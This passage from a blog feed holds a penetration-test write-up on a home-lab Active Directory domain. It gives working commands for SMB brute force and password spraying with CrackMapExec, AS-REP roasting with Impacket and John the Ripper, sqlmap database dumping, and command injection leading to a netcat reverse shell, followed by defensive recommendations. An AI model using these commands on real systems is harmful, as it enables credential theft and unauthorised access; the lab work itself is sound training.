+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Establish organizational units (OUs) to organize Active Directory objects effectively.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled9.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Configure Group Policy Objects (GPOs) to enforce security settings and password policies.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Create requisite user accounts, groups, and computer accounts as per organizational requirements.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Configure DNS settings to ensure seamless name resolution within the domain.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="524-validate-active-directory-configuration">5.2.4: Validate Active Directory Configuration
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>Validate the Active Directory configuration by reviewing the organizational units, user accounts, groups, and computer accounts.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Ensure proper application of Group Policy Objects (GPOs) by executing &amp;ldquo;gpresult&amp;rdquo; or &amp;ldquo;rsop.msc&amp;rdquo; on client machines.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled10.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Conduct comprehensive testing of user authentication, group membership, and other Active Directory functionalities to verify proper operation.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="53-attacks">5.3 Attacks
+&lt;/h2>&lt;h3 id="531-brute-force-attack">5.3.1 Brute Force Attack
+&lt;/h3>&lt;ul>
+&lt;li>To execute this attack, the CrackMapExec tool was utilized. CrackMapExec is a powerful penetration testing tool commonly used for scanning and exploitation tasks in Windows environments. It supports various protocols, including SMB, and allows for automated password guessing using wordlists.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>Command: &lt;code>sudo crackmapexec smb 192.168.85.3 -u ap -p /usr/share/wordlists/rockyou.txt&lt;/code>&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>In this specific command:
+&lt;ul>
+&lt;li>&lt;code>sudo crackmapexec smb 192.168.85.3&lt;/code>: Specifies the use of CrackMapExec to target the SMB protocol on the IP address 192.168.85.3. The SMB protocol is commonly used for file sharing in Windows environments.&lt;/li>
+&lt;li>&lt;code>u ap&lt;/code>: Specifies the username &amp;ldquo;ap&amp;rdquo; for authentication. This is the username that will be used in the brute force attack.&lt;/li>
+&lt;li>&lt;code>p /usr/share/wordlists/rockyou.txt&lt;/code>: Specifies the path to a wordlist file containing a list of commonly used passwords (rockyou.txt). CrackMapExec will attempt to authenticate with each password in the wordlist in order to gain access to the system.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled11.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>The provided image depicts the output of the brute force attack conducted using CrackMapExec. It provides insight into the results of the attack, including any successful authentication attempts and the discovered credentials.&lt;/p>
+&lt;hr>
+&lt;h3 id="532-password-spraying-attack">5.3.2 Password Spraying Attack
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>This attack was carried out using the CrackMapExec program. A potent penetration testing tool called CrackMapExec is frequently used for Windows environment scanning and exploitation activities. It enables automated password guessing using wordlists and supports a number of protocols, including SMB.&lt;/p>
+&lt;p>&lt;strong>Command:&lt;/strong> &lt;code>crackmapexec smb 192.168.85.3 -d [server.web](http://server.web/) -u username.txt -p Password@123 --continue-on-success&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>In this specific command:
+&lt;ul>
+&lt;li>&lt;code>crackmapexec smb 192.168.85.3&lt;/code>: Initiates CrackMapExec to target the SMB protocol on the specified IP address.&lt;/li>
+&lt;li>&lt;code>d server.web&lt;/code>: Specifies the domain name for authentication.&lt;/li>
+&lt;li>&lt;code>u username.txt&lt;/code>: Provides a file containing usernames for the attack.&lt;/li>
+&lt;li>&lt;code>p Password@123&lt;/code>: Sets the password to be used during the attack.&lt;/li>
+&lt;li>&lt;code>-continue-on-success&lt;/code>: Instructs the tool to continue the attack even after successful authentication attempts.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled12.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>The provided screenshot below illustrates the output of the password spraying attack using CrackMapExec, revealing insights into successful authentication attempts and discovered credentials.&lt;/p>
+&lt;p>Instead of trying multiple passwords for a single username, try a single password across multiple usernames. This reduces the risk of account lockouts and increases the likelihood of success.&lt;/p>
+&lt;hr>
+&lt;h3 id="533-asreproast-attack">5.3.3 Asreproast attack
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>The ASREPRoast attack utilizes tools such as &lt;strong>&lt;code>GetNPUsers.py&lt;/code>&lt;/strong> from the Impacket toolkit to request AS_REP messages containing encrypted ticket-granting service (TGS) tickets for vulnerable Active Directory user accounts. These messages are then captured and cracked offline using password-cracking tools like John the Ripper or Hashcat, revealing plaintext passwords. This attack leverages weaknesses in authentication mechanisms to compromise user accounts within the domain, demonstrating a significant security risk in Active Directory environments.&lt;/p>
+&lt;p>&lt;strong>Command:&lt;/strong> &lt;code>python3 GetNPUser.py [server.web/](http://server.web/) -userfile ../../username.txt -format hashcat -outputfile hashes.asreproast&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>In this specific command:
+&lt;ul>
+&lt;li>&lt;strong>&lt;code>python3 GetNPUser.py&lt;/code>&lt;/strong>: Executes the Python script &lt;strong>&lt;code>GetNPUser.py&lt;/code>&lt;/strong> for performing the attack.&lt;/li>
+&lt;li>&lt;strong>&lt;code>server.web/&lt;/code>&lt;/strong>: Specifies the target Active Directory domain for the attack.&lt;/li>
+&lt;li>&lt;strong>&lt;code>userfile ../../username.txt&lt;/code>&lt;/strong>: Specifies the path to a file containing a list of usernames to target within the domain.&lt;/li>
+&lt;li>&lt;strong>&lt;code>format hashcat&lt;/code>&lt;/strong>: Specifies the output format for the captured hashes, compatible with Hashcat for offline cracking.&lt;/li>
+&lt;li>&lt;strong>&lt;code>outputfile hashes.asreproast&lt;/code>&lt;/strong>: Specifies the output file name for storing the captured hashes in the ASREPRoast attack format.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled13.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>The ASREPRoast attack was successfully executed against the domain &lt;strong>&lt;code>server.web&lt;/code>&lt;/strong>. The Impacket toolkit was used with the &lt;strong>&lt;code>GetNPUser.py&lt;/code>&lt;/strong> script to retrieve AS-REP hashes for users within the domain.&lt;/p>
+&lt;p>&lt;em>Cracking the Hashes&lt;/em>&lt;/p>
+&lt;p>&lt;strong>Command: &lt;code>john -w=password_kerb.txt hashs.txt&lt;/code>&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>In this specific command:
+&lt;ul>
+&lt;li>&lt;strong>&lt;code>john&lt;/code>&lt;/strong>: Refers to the John the Ripper password cracking tool.&lt;/li>
+&lt;li>&lt;strong>&lt;code>w=password_kerb.txt&lt;/code>&lt;/strong>: Specifies the wordlist file (&lt;strong>&lt;code>password_kerb.txt&lt;/code>&lt;/strong>) containing potential passwords.&lt;/li>
+&lt;li>&lt;strong>&lt;code>hashs.txt&lt;/code>&lt;/strong>: Represents the file containing hashed passwords obtained from the ASREPRoast attack.&lt;/li>
+&lt;li>The command aims to crack the hashes in &lt;strong>&lt;code>hashs.txt&lt;/code>&lt;/strong> using the passwords from &lt;strong>&lt;code>password_kerb.txt&lt;/code>&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled14.png"
+loading="lazy"
+>
+The ASREPRoast attack proved effective against the &lt;code>server.web&lt;/code> domain. By employing the Impacket toolkit and the &lt;code>GetNPUser.py&lt;/code> script, AS-REP hashes for domain users were obtained. Following this, &lt;code>John the Ripper&lt;/code> was employed to crack these hashes offline, with the intention of uncovering plaintext passwords linked to the hashed credentials.&lt;/p>
+&lt;hr>
+&lt;h3 id="534-sql-injection-attack">5.3.4 SQL Injection Attack
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Initial Login Attempt:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Attempted to login with standard credentials.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled15.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Received an error message indicating a potential vulnerability.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled16.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>BurpSuite Capturing:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Captured the login request using BurpSuite.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Sent the request to the repeater for further analysis.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled17.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Request Analysis:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Saved the captured request as a file named &amp;lsquo;sql&amp;rsquo;.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Analyzed the request in BurpSuite repeater.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled18.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>SQLMap Execution:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Executed SQLMap to exploit the SQL injection vulnerability.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Command Used: &lt;code>sqlmap -r sql --dbs --batch&lt;/code>&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>r sql&lt;/code>: Specifies the file containing the captured request.&lt;/li>
+&lt;li>&lt;code>-dbs&lt;/code>: Retrieves available databases.&lt;/li>
+&lt;li>&lt;code>-batch&lt;/code>: Executes SQLMap in batch mode for automation.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled19.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Database Enumeration:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>SQLMap identified the website as vulnerable to SQL injection.&lt;/li>
+&lt;li>Retrieved available databases using the command.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Data Extraction:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Command Used: &lt;code>sqlmap -r sql --dbs -D gauranga --dump&lt;/code>.&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>D gauranga&lt;/code>: Specifies the database to target.&lt;/li>
+&lt;li>&lt;code>-dump&lt;/code>: Extracts data from the specified database.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled20.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Credential Retrieval:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>SQLMap successfully retrieved usernames and passwords from the &amp;lsquo;gauranga&amp;rsquo; database.&lt;/li>
+&lt;li>Obtained admin credentials for further exploitation.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Admin Login:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Successfully logged in using the obtained admin credentials.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled21.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled22.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>The SQL injection attack was successful in exploiting the vulnerability present in the login form. By leveraging SQLMap, sensitive data including usernames and passwords were extracted from the database, granting access as an admin user.&lt;/p>
+&lt;hr>
+&lt;h3 id="535-command-injection-attack">5.3.5 Command Injection Attack
+&lt;/h3>&lt;p>&lt;em>Attack Execution:&lt;/em>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Initial Ping Test:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Attempted to execute a ping command to test the command injection vulnerability.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Command Injection Attempt:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Injected the command &lt;code>&amp;amp;whoami&lt;/code> into the ping box.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Observed the response showing the current user&amp;rsquo;s authority as &amp;lsquo;system&amp;rsquo;.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled23.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Netcat Setup:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Set up a listener using Netcat for receiving the reverse shell.&lt;/li>
+&lt;li>Command Used: &lt;code>nc -lnvp 9001&lt;/code>.
+&lt;ul>
+&lt;li>&lt;code>nc&lt;/code>: Netcat command.&lt;/li>
+&lt;li>&lt;code>lnvp&lt;/code>: Options for listening on a specific port (9001) and verbose mode.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Reverse Shell Acquisition:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Searched for a suitable reverse shell payload on &lt;a class="link" href="https://www.revshells.com/" target="_blank" rel="noopener"
+>revshells.com&lt;/a>.&lt;/li>
+&lt;li>Selected a reverse shell payload compatible with the target environment.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Payload Integration:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Inserted the obtained reverse shell payload into the ping box.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled24.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Executed the ping command with the injected payload.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled25.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Command Execution:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>As a result of the injected payload, gained command execution within the Windows Server system.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>The command injection attack successfully exploited the vulnerability, allowing for arbitrary command execution. By injecting malicious commands into the ping box, an attacker gained access to the target system with system-level privileges, facilitating further malicious activities.&lt;/p>
+&lt;hr>
+&lt;h3 id="54-bloodhound-analysis">5.4 BloodHound Analysis
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Setup:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Installed Neo4j, a graph database management system, and created an account. Neo4j serves as the backend database for BloodHound, storing and analyzing data collected from the Active Directory environment.&lt;/li>
+&lt;li>Installed BloodHound on a Windows system. BloodHound is a powerful tool designed for Active Directory security assessment and reconnaissance, utilizing graph theory and database queries to analyze relationships and permissions within Active Directory.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Data Collection:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Utilized SharpHound, a data collection tool within BloodHound, to gather information from the Windows Active Directory environment. SharpHound collected data in JSON format.&lt;/li>
+&lt;/ul>
+&lt;h3 id="command-for-bloodhound-data-collection">Command for BloodHound Data Collection:
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">.&lt;span class="se">\S&lt;/span>harpHound.exe -c All
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Data Import:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Imported the collected data from the Windows Active Directory environment in JSON format into the Neo4j database. This step enabled BloodHound to analyze the data and generate visualizations for further analysis.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Analysis:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Leveraged BloodHound&amp;rsquo;s visualization and querying features to perform the following analyses:
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Map of Active Directory Environment:&lt;/strong> Visual representation showcasing relationships between users, groups, computers, and permissions within the Active Directory infrastructure.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled26.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Potential Attack Paths for User &amp;ldquo;ap&amp;rdquo;:&lt;/strong> Identified potential attack paths that user &amp;ldquo;ap&amp;rdquo; could exploit for lateral movement and privilege escalation within the Active Directory environment.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled27.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Map of All Users:&lt;/strong> Visualization depicting all users present in the Active Directory environment, along with their respective relationships and permissions, aiding in the identification of potential security vulnerabilities related to user accounts.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled28.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="6-recommendations">6. Recommendations
+&lt;/h2>&lt;p>Based on the findings of our penetration testing of the Active Directory environment, the following recommendations are proposed to strengthen the security posture:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Implement Regular Patch Management:&lt;/strong> Establish a routine patch management process to ensure all servers and applications within the Active Directory environment are up-to-date with the latest security patches and updates.&lt;/li>
+&lt;li>&lt;strong>Enhance Password Policies:&lt;/strong> Enforce stronger password policies, including the use of complex passwords, regular password changes, and multi-factor authentication (MFA) where applicable.&lt;/li>
+&lt;li>&lt;strong>Implement Network Segmentation:&lt;/strong> Segment the network to isolate critical systems and sensitive data from potential attackers. Implement firewall rules and access controls to restrict unauthorized access between network segments.&lt;/li>
+&lt;li>&lt;strong>Conduct Regular Security Training:&lt;/strong> Provide comprehensive security awareness training for employees to educate them about common security threats, phishing attacks, and best practices for safeguarding sensitive information.&lt;/li>
+&lt;li>&lt;strong>Implement Security Monitoring:&lt;/strong> Deploy robust security monitoring tools to continuously monitor the Active Directory environment for suspicious activities, unauthorized access attempts, and potential security breaches.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="7-risk-assessment">7. Risk Assessment
+&lt;/h2>&lt;p>A comprehensive risk assessment was diligently executed to thoroughly evaluate the potential impact and likelihood of identified vulnerabilities within the Active Directory environment. Risks were meticulously categorized based on severity and meticulously prioritized for remediation, considering their potential impact on business operations and data security.&lt;/p>
+&lt;hr>
+&lt;h2 id="8-regulatory-compliance-considerations">8. Regulatory Compliance Considerations
+&lt;/h2>&lt;p>An assessment was conducted to ascertain compliance of the Active Directory system with key regulations, including the &lt;strong>&lt;code>General Data Protection Regulation (GDPR)&lt;/code>&lt;/strong> for protecting personal data within the EU, the &lt;strong>&lt;code>Health Insurance Portability and Accountability Act (HIPAA)&lt;/code>&lt;/strong> for safeguarding health information in the US, and the &lt;strong>&lt;code>Payment Card Industry Data Security Standard (PCI DSS)&lt;/code>&lt;/strong> for securing credit card data. Subsequent recommendations were provided to ensure alignment with these regulations and to maintain the confidentiality and security of data.&lt;/p>
+&lt;hr>
+&lt;h2 id="9-long-term-security-considerations">9. Long-Term Security Considerations
+&lt;/h2>&lt;p>To ensure ongoing security in the Active Directory environment, it&amp;rsquo;s important to plan for long-term improvements. This could involve identifying key security objectives, establishing regular security assessments, implementing continuous monitoring measures, and providing ongoing security training for staff. By taking a proactive approach to long-term security, the organization can better protect its IT infrastructure against evolving threats.&lt;/p>
+&lt;hr>
+&lt;h2 id="10-disclaimer">10. Disclaimer
+&lt;/h2>&lt;p>This penetration test report is provided solely for informational purposes. The findings and recommendations contained within should be carefully evaluated and implemented by qualified security professionals in accordance with organizational policies and best practices. It is important to note that the testing and setup were conducted on an isolated environment within the researcher&amp;rsquo;s own computer system. Therefore, the outcomes and effectiveness of any security measures may differ in a real-world organizational setting. Additionally, while every effort has been made to ensure the accuracy of the findings, no guarantees are made regarding the completeness or timeliness of the information presented.&lt;/p>
+&lt;hr>
+&lt;h2 id="11-acknowledgments">11. Acknowledgments
+&lt;/h2>&lt;p>I extend my sincere appreciation to the organizations and individuals who provided guidance, resources, and support during the preparation and execution of this penetration testing project. Special thanks to &lt;strong>&lt;code>Eminence Ways Pvt. Ltd&lt;/code>&lt;/strong>, whose assistance and cooperation were invaluable in facilitating the successful completion of this project.&lt;/p>
+&lt;hr>
+&lt;h2 id="12-conclusion">12. Conclusion
+&lt;/h2>&lt;p>In conclusion, the penetration testing revealed vulnerabilities within the Active Directory environment. Addressing these vulnerabilities and implementing recommended security measures is crucial for enhancing overall security. The cooperation of the organization&amp;rsquo;s IT team was invaluable throughout the testing process. It is recommended that immediate action be taken to mitigate risks and strengthen cybersecurity resilience.&lt;/p>
+&lt;hr>
+&lt;p>&lt;em>Signed,&lt;/em>&lt;/p>
+&lt;p>Gauranga Gautam&lt;/p></description></item></channel></rss>
